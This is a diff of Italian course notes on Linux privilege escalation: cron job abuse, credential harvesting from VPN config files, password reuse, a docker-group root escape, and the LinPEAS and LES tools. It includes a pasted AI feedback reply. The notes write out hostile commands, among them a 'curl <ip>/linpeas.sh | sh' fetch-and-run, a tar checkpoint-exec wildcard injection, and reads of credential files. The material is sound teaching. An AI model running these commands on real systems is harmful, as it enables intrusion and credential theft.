@@ -12,6 +12,144 @@
 
 **Cron** è lo scheduler di task sui sistemi Unix: esegue comandi **periodicamente** secondo espressioni nei file **crontab**.
 
+**Cron** è semplicemente un **servizio del sistema operativo** (daemon) che:
+
+1. Legge un file (crontab) che contiene "cosa eseguire e quando"
+2. Esegue quei comandi automaticamente agli orari specificati
+3. Non ha bisogno che tu sia loggato — gira in background sempre
+
+Esempi di cose che cron fa di solito:
+
+- Backup notturni delle basi dati
+- Pulizia di file temporanei
+- Rotazione dei log
+- Sincronizzazione di dati
+
+### La sintassi crontab (semplificata)
+
+```
+m  h  dom mon dow   command
+│  │  │   │   │     └─ cosa eseguire
+│  │  │   │   └────── giorno della settimana (0=domenica, 1=lunedì, ... 6=sabato)
+│  │  │   └────────── mese (1-12)
+│  │  └────────────── giorno del mese (1-31)
+│  └───────────────── ora (0-23)
+└──────────────────── minuto (0-59)
+```
+
+**Esempi concreti**:
+
+```bash
+# Ogni giorno alle 3 di notte (minuto 0, ora 3)
+0 3 * * *  /usr/local/bin/backup.sh
+
+# Ogni lunedì (dow=1) alle 9:30
+30 9 * * 1  /usr/bin/updatedb
+
+# Ogni primo del mese alle 00:00
+0 0 1 * *  /opt/scripts/monthlyreset.sh
+
+# Ogni 5 minuti (*/5 significa "ogni 5")
+*/5 * * * *  /usr/bin/healthcheck.sh
+```
+
+### Dove si mettono i cronjob
+
+Ci sono due posti:
+
+### 1. Crontab personale di un utente
+
+```bash
+crontab -e              # edita il crontab dell'utente corrente
+crontab -l              # mostra il crontab dell'utente corrente
+```
+
+Quando lo editi, è **senza il campo "user"**:
+
+```
+# nel mio file crontab (sono utente 'mario')
+0 3 * * *  /usr/local/bin/mio_backup.sh
+```
+
+Questo cronjob girerà **come mario** (perché è il suo crontab personale).
+
+### 2. Crontab di sistema
+
+```bash
+cat /etc/crontab
+```
+
+Questo file **ha il campo "user"** esplicito:
+
+```
+# nel file /etc/crontab (gestito da root, legge tutti gli utenti)
+0 3 * * *  root   /usr/local/bin/backup.sh
+0 5 * * *  www-data  /var/www/cleanup.sh
+30 9 * * 1 postgres  /opt/db_sync.sh
+```
+
+Cron esegue ogni riga **con l'utente specificato in quel campo**. Nel primo caso, come root; nel secondo, come www-data; nel terzo, come postgres.
+
+Inoltre:
+
+```bash
+ls -la /etc/cron.d/     # frammenti aggiuntivi di cronjob di sistema
+```
+
+### Perché cron è un bersaglio — il punto critico
+
+Immagina questo scenario reale:
+
+```
+# Nel file /etc/crontab
+0 3 * * *  root  /usr/local/bin/backup.sh
+```
+
+Ogni notte alle 3:00, il sistema esegue `backup.sh` **come root** (uid=0).
+
+Se tu (un utente non privilegiato) riuscissi a **modificare** il file `/usr/local/bin/backup.sh` e metterci una reverse shell, allora:
+
+```
+Minuto 59:59 → sei non privilegiato
+Minuto 00:00 (ore 3) → cron esegue backup.sh come ROOT
+Minuto 00:01 → ricevi una shell come ROOT
+```
+
+Quindi: **trovare un cronjob scrivibile che gira come root = trovare una strada per diventare root**.
+
+### Scenario pratico — Test manuale
+
+Prova questo sul tuo laboratorio:
+
+```bash
+# 1. Come utente normale, crea un cronjob che gira ogni minuto
+crontab -e
+# aggiungi questa riga:
+* * * * * echo "ciao" >> /tmp/cron_test.txt
+# salva e esci
+
+# 2. Aspetta un minuto
+sleep 65
+
+# 3. Verifica
+cat /tmp/cron_test.txt
+# dovresti vedere "ciao" aggiunto ogni minuto
+```
+
+Questa è la meccanica di base: cron **esegue comandi periodicamente, come l'utente specificato**.
+
+### La domanda che porta ai 3 metodi
+
+Ora la domanda dell'attaccante è: **come faccio a modificare ciò che il cron esegue, se non ho i privilegi diretti?**
+
+Tre risposte (tre metodi):
+
+1. **Method 1**: Lo script cron è **scrivibile da me** → lo riscrivo direttamente
+2. **Method 2**: Lo script cron ha un **percorso relativo** e il PATH è controllabile → metto un mio script omonimo prima nel PATH
+3. **Method 3**: Lo script cron usa una **wildcard** e io posso creare **file con nomi speciali** che la shell interpreta come opzioni → comando eseguito diversamente
+
+### Breve riassunto introduttivo di cron
+
 ```bash
 crontab -l                 # cronjob dell'utente corrente
 cat /etc/crontab           # crontab di sistema (ha il campo "user"!)
@@ -137,7 +275,7 @@ tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=myshell.sh my
 > 
 > Se il processo gira con privilegi elevati → RCE / PE. È lo stesso peccato di [[ETHL 0x04 — Web Security p2]]: **confusione tra dati e codice** (qui: tra "nome di file-dato" e "opzione-comando"). **Difesa**: quotare le variabili, usare `./` davanti alle wildcard (`tar ... -- *` o `./` glob) così i nomi non partono con `-`, o `--` per terminare le opzioni.
 
-> [!todo] Hands-on (slide 19) Practical 0x07 level 1 e 2 — `linux-privesc` (ambiente Docker). Applica i 3 metodi.
+> [!todo] Hands-on (slide 19) Practical 0x07 level 1 e 2 — `linux-privesc` (ambiente Docker). Applica i 3 metodi. https://github.com/5ud0ch0p/linux-privesc
 
 ---
 
@@ -149,7 +287,8 @@ Avere un foothold = poter **raccogliere più dettagli** dal sistema. Tre sorgent
 
 Se hai bucato un server, stai impersonando l'utente del servizio. I **file di config dell'app** spesso contengono password (es. password del DB).
 
-> [!example] Scenario tipico Buchi una web app → leggi la **password del DB** dai file di config → accedi al database (data exfiltration) → raccogli utenti e password dell'applicazione.
+> [!example] Scenario tipico 
+> Buchi una web app → leggi la **password del DB** dai file di config → accedi al database (data exfiltration) → raccogli utenti e password dell'applicazione.
 
 > [!info] Perché conta — il riuso delle password Gli umani **riusano le password**. Quindi:
 > 
@@ -158,7 +297,7 @@ Se hai bucato un server, stai impersonando l'utente del servizio. I **file di co
 > su - <user>              # prova le password raccolte
 > ```
 > 
-> Una password trovata in un config può aprire l'account di un altro utente (lateral movement) o di root. È il punto (1) di [[ETHL 0x05 — Hacking Unix p1]]: "informazioni raccolte con l'accesso iniziale".
+> Una password trovata in un config può aprire l'account di un altro utente ([[Lateral Movement]]) o di root. È il punto (1) di [[ETHL 0x05 — Hacking Unix p1]]: "informazioni raccolte con l'accesso iniziale".
 
 > [!example] Scenario realistico — VPN
 > 
@@ -168,6 +307,103 @@ Se hai bucato un server, stai impersonando l'utente del servizio. I **file di co
 > root
 > password123             ← credenziali in chiaro
 > ```
+
+#### Passo 1: Leggi il file .ovpn
+
+```bash
+cat myvpn.ovpn
+```
+
+Output:
+
+```
+client
+remote vpn.company.com 1194 udp
+auth-user-pass /etc/openvpn/auth.txt
+cipher AES-256-CBC
+...
+```
+
+**Cosa impari da questo**: "Per connettersi a questa VPN, usa le credenziali che sono nel file `/etc/openvpn/auth.txt`".
+
+#### Passo 2: Leggi il file delle credenziali
+
+```bash
+cat /etc/openvpn/auth.txt
+```
+
+Output:
+
+```
+vpn_admin
+password123
+```
+
+**Cosa ottieni**: le credenziali **in chiaro** per accedere a quella VPN.
+
+---
+
+#### La risposta alle tue due domande
+
+> **Domanda 1**: "Prendendo il contenuto di .ovpn ho il via libera nella rete privata?"
+
+**NO**. Il `.ovpn` da solo **non ti dà accesso**. Ti dice solo **dove trovare** le credenziali. Non contiene le password — è un riferimento a un altro file.
+
+> **Domanda 2**: "Facendo cat /etc/openvpn/auth.txt posso ottenere la coppia utente password?"
+
+**SÌ**, esattamente questo. Lì dentro sono le credenziali **in chiaro**.
+
+---
+
+#### Cosa fai con quelle credenziali (il valore dell'attacco)
+
+Una volta che hai `vpn_admin / password123`:
+
+#### Scenario A: Usi la VPN da quella stessa macchina
+
+```bash
+# Sulla macchina compromessa, connettiti alla VPN
+openvpn myvpn.ovpn
+# → entri nella rete privata come vpn_admin
+# → puoi scannerizzare/attaccare altri servizi interni
+```
+
+#### Scenario B: Usi le credenziali su altri sistemi (riuso)
+
+```bash
+# Su una macchina diversa (tua, attacker)
+# Accedi a un altro servizio che riusa quelle credenziali:
+ssh vpn_admin@internal-server.local
+# password: password123 ✓ funziona!
+
+# O su un servizio di management interno
+curl -u vpn_admin:password123 http://internal-admin.local/api
+```
+
+Questo è il punto cruciale di [[ETHL 0x06 — Hacking Unix p2]] **§ 2.1**: gli umani **riusano le password**. Se trovi `vpn_admin:password123` nel config di una VPN, è probabile che:
+
+- Funziona anche su SSH di altri server interni
+- Funziona sul database interno
+- Funziona sul servizio di admin
+
+---
+
+#### Riassunto dell'attacco
+
+```
+Comprometto una macchina (www-data su web server)
+    ↓
+Leggo /var/www/config/vpn.conf → vedo "auth-user-pass /etc/openvpn/auth.txt"
+    ↓
+Leggo /etc/openvpn/auth.txt → ottengo vpn_admin / password123
+    ↓
+Provo quelle credenziali su SSH interno → funzionano!
+    ↓
+Sono dentro la rete privata come vpn_admin → PE/lateral movement completata
+```
+
+**Il .ovpn da solo non è niente**, è una **mappa** che ti dice dove cercare. Le credenziali **vere** sono in `/etc/openvpn/auth.txt`.
+
 
 ### 2.2 Crackare le password
 
@@ -238,9 +474,11 @@ john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000
 
 ## 3. LinPEAS
 
-> [!abstract] LinPEAS = Linux Privilege Escalation Awesome Script Script che cerca automaticamente possibili **percorsi di privilege escalation** su host Unix (non solo Linux). I check sono spiegati su `book.hacktricks.xyz`. **Nessuna dipendenza** (gira ovunque).
+> [!abstract] LinPEAS = Linux Privilege Escalation Awesome Script 
+> Script che cerca automaticamente possibili **percorsi di privilege escalation** su host Unix (non solo Linux). I check sono spiegati su `book.hacktricks.xyz`. **Nessuna dipendenza** (gira ovunque).
 
-> [!warning] È rumoroso LinPEAS è **rumoroso, lascia tracce ed è facilmente rilevato dagli EDR** (Endpoint Detection and Response). Va bene nei CTF/lab, rischioso in engagement reali stealth.
+> [!warning] È rumoroso 
+> LinPEAS è **rumoroso, lascia tracce ed è facilmente rilevato dagli EDR** (Endpoint Detection and Response). Va bene nei CTF/lab, rischioso in engagement reali stealth.
 
 ```bash
 ./linpeas.sh         # scansione standard
@@ -250,14 +488,16 @@ john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000
 
 **Legenda colori** (da saper leggere):
 
-|Colore|Significato|
-|---|---|
-|**Rosso/Giallo**|95% un vettore di PE|
-|**Rosso**|da guardare|
-|Verde|cose comuni (utenti, gruppi, SUID/SGID, mount, script, cronjob)|
-|LightMagenta|il tuo username|
+| Colore           | Significato                                                     |
+| ---------------- | --------------------------------------------------------------- |
+| **Rosso/Giallo** | 95% un vettore di PE                                            |
+| **Rosso**        | da guardare                                                     |
+| Verde            | cose comuni (utenti, gruppi, SUID/SGID, mount, script, cronjob) |
+| LightMagenta     | il tuo username                                                 |
 
-> [!example] Esempio d'esame — il gruppo docker come vettore di PE LinPEAS evidenzia che l'utente è nel gruppo **`docker`**. Perché è un vettore?
+> [!example] Esempio d'esame — il gruppo docker come vettore di PE 
+>![[Pasted image 20260614200543.png]] ![[Pasted image 20260614200632.png]]
+> LinPEAS evidenzia che l'utente è nel gruppo **`docker`**. Perché è un vettore?
 > 
 > ```bash
 > docker run -it -v /:/host/ bash:latest bash    # monta tutto il filesystem host
@@ -266,6 +506,22 @@ john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000
 > ```
 > 
 > L'utente è **non privilegiato**, ma essere nel gruppo `docker` gli permette di **avviare un container come root e montarci il filesystem dell'host** → accede all'host come root. È un Confused Deputy: il daemon Docker (root) esegue azioni per conto di un utente che non dovrebbe avere quel potere. **Difesa**: il gruppo `docker` equivale a root — non darlo a utenti non fidati.
+> **Perché di default è root:** il binario `docker` non ha permessi propri — parla con il **socket** `/var/run/docker.sock`, che è posseduto da `root:docker` con permessi `srw-rw----`. Chiunque possa scrivere su quel socket può chiedere al **daemon** (che gira come root, senza ulteriori controlli di autorizzazione) di fare qualsiasi cosa: creare container, montare volumi, eseguire con `--privileged`, ecc. Il daemon non fa distinzioni granulari — "puoi parlarmi" equivale a "puoi fare tutto ciò che io (root) posso fare". È per questo che appartenere al gruppo `docker` è descritto come "equivalente a root": **non è un permesso intermedio, è una porta diretta verso un processo root senza ACL aggiuntive**.
+
+Sì, è un po' generico — è essenzialmente il recap delle slide più un esempio (docker). Il problema per l'esame: così sai _descrivere_ LinPEAS, ma non hai allenato la cosa che conta davvero, cioè **leggere un output reale e isolare il vettore giusto in mezzo a centinaia di righe**.
+
+(Nota: le due immagini incollate sono path locali di Obsidian, non le vedo da qui — se vuoi che commenti cosa mostrano, descrivimele o incollami il testo rilevante.)
+
+Cosa aggiungerei per renderla più "esame-ready":
+
+**1. Collegamento con i vettori già visti.** [[LinPEAS]] non è un argomento isolato — è lo strumento che _trova_ le cose delle note precedenti. Vale la pena scrivere esplicitamente: "lo script cron wildcard del Method 3 → LinPEAS lo segnala in [colore] con [testo]", "il SUID con PATH relativo di 0x05 → sezione SUID, evidenziato in rosso". Senza questo, LinPEAS resta uno strumento a sé, scollegato dal resto del corso.
+
+**2. Checklist mentale di lettura.** Con output da migliaia di righe, serve un ordine: di solito si parte da `sudo -l`, poi SUID/SGID, capabilities, gruppi pericolosi (docker/lxd/disk), cron scrivibili, file con permessi anomali in `/etc`. La nota attuale dà solo la legenda colori, non l'ordine in cui guardare.
+
+**3. Falsi positivi.** LinPEAS marca in rosso/giallo _molto_ — incluse cose non sfruttabili nel contesto specifico. Vale la pena una riga su "rosso ≠ exploit garantito, va verificato a mano" (è anche un punto che spesso chiedono per distinguere chi capisce lo strumento da chi lo usa a scatola chiusa).
+
+**4. Trasferimento sul target** (manca del tutto): `python3 -m http.server` lato attaccante + `curl <ip>/linpeas.sh | sh` o `wget` lato target — è il passaggio pratico che la nota salta.
+
 
 ---
 
@@ -279,6 +535,8 @@ Per ogni exploit calcola l'esposizione: **Highly probable / Probable / Less prob
 ./les.sh              # cerca exploit applicabili al kernel corrente
 ./les.sh --checksec   # stato delle protezioni del kernel (PTI, stack protector, ...)
 ```
+
+![[Pasted image 20260614202237.png]]
 
 > [!example] Output tipico
 > 
@@ -294,7 +552,9 @@ Per ogni exploit calcola l'esposizione: **Highly probable / Probable / Less prob
 > [!note] LinPEAS vs LES
 > 
 > - **LinPEAS** → misconfigurazioni e vettori di PE a livello di sistema/configurazione
-> - **LES** → vulnerabilità del **kernel** sfruttabili (kernel exploit) Si usano insieme: prima le misconfig (più affidabili e silenziose), poi i kernel exploit (più rumorosi e rischiosi, possono crashare la macchina).
+> - **LES** → vulnerabilità del **kernel** sfruttabili (kernel exploit) 
+>  
+>Si usano insieme: prima le misconfig (più affidabili e silenziose), poi i kernel exploit (più rumorosi e rischiosi, possono crashare la macchina).
 
 ---
 
